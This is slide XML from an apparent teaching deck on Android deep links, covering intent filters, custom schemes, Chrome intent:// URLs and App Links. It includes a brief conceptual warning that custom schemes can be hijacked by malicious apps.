              <a:t>android:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>scheme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>=“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>host</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>=“profile”</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>pathPrefix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>=“/view/”&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>&lt;/intent-filter&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;/activity&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DF6FCD0-3329-04A0-DA66-A0CB82FA7875}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7864580" y="1698171"/>
            <a:ext cx="4327419" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>android:scheme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>":</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Defines the URL scheme (e.g., https or http).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>android:host</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>=”profile"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: Defines the domain or host that triggers the deep link.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>android:pathPrefix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>="/view": </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Defines the specific path in the URL that directs to the activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>So the complete </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> looks likes this: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>://profile/view</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA8942E1-4770-B6DD-7529-CF79B37D0FFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022886" y="5857597"/>
            <a:ext cx="10146227" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>In Android apps, an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Intent Filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>is like a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>signboard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> that tells the Android system:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" i="1" dirty="0"/>
              <a:t>“Hey! My app (or this activity/service/receiver) knows how to handle this kind of request.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34775CE2-D9B0-DA62-85FE-FC9965883CB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2550208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A Complete Guide to Mobile App Deep Linking and Its Benefits">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4737ED8B-817C-998D-BA02-7690062311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54000"/>
            <a:ext cx="10972800" cy="6350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ue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8436824-C9B3-2F2A-AF08-EA9D28FB7A6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2986228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76BC92-A695-4C77-1A44-FBAA9F2AF9F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3644537" y="714104"/>
            <a:ext cx="3407984" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Intent Filter Parts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{593FF31D-A6F6-85A3-45AF-86113E1B07DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="836022" y="1763486"/>
            <a:ext cx="10620103" cy="4401205"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Action</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -  The action tells what the app wants to do – like view something, send data, pick a file, make a  call, etc.(e.g., VIEW, SEND, MAIN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Types Of Actions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>– </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>System Action </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>– Predefined by Android (e.g., VIEW, SEND, MAIN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Custom Action </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>– Defined by you (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>com.null.app.LOGIN_USER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Category</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -  Type of environment. A category tells Android </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>how</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> an activity should be used.(e.g., LAUNCHER, BROWSABLE). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>It gives extra information about the environment or behavior for that intent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>DEFAULT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> – Default category. Needed when starting activity using an implicit intent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>LAUNCHER – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Marks main entry point of the app.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>BROWSABLE – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Allows activity to be opened from web links.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> - What kind of data URI it accepts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F10BD0A-5E8C-9A8F-9566-044B6D65F9DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1981924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D462BF-D9C2-8E18-7BEB-7FD9928CA5CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3942918" y="1277209"/>
            <a:ext cx="3963489" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>Types Of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>Deeplinks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{412E1307-A2E2-EF34-0CC9-DFFA39B4B19A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3942918" y="2782614"/>
            <a:ext cx="5605767" cy="1569660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Deep Links (custom scheme)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Chrome intent:// Scheme</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Web Links (HTTP / HTTPS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Android App Links </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8E92C85-8F4A-AAD2-EA03-71659E2F20B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="995173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I Leak Other's Access Token by Exploiting Evil Deeplink Flaw | by  Crisdeo Nuel Siahaan | InfoSec Write-ups">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86FBAD52-F71E-1A29-D2D7-D99CAA6F86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21" y="-13063"/>
            <a:ext cx="528955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2962CB4-6CCF-9489-C307-6C0BF13DF362}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4910514" y="1001438"/>
            <a:ext cx="6326778" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deep Links (custom scheme)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96E703AC-5327-C8F2-B857-5B032511030D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4610068" y="2184250"/>
            <a:ext cx="6927671" cy="3477875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>With </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>custom schemes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>://login/token123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" i="1" dirty="0"/>
              <a:t>any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> app can register the same scheme (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>) in its manifest.</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If multiple apps claim the scheme, Android will </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>prompt the user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> which app to open, or a malicious app can hijack it silently in some cases.</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This makes deep links dangerous for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>sensitive flows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> like logins, password resets, or payments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0938EF4B-E258-761D-7E98-5BA62C0E9BBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="464960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B26F1-0613-93F1-C217-902EBDF7D70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518DEF-F40C-F629-0D2B-CB54B30F9966}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1841862"/>
            <a:ext cx="11142618" cy="3508653"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Google introduced the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>intent:// scheme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> so that websites can trigger an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>explicit intent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> directly targeting your app’s package.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>intent://product/123#Intent;scheme=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>myapp;package</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>com.example.myapp;end</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
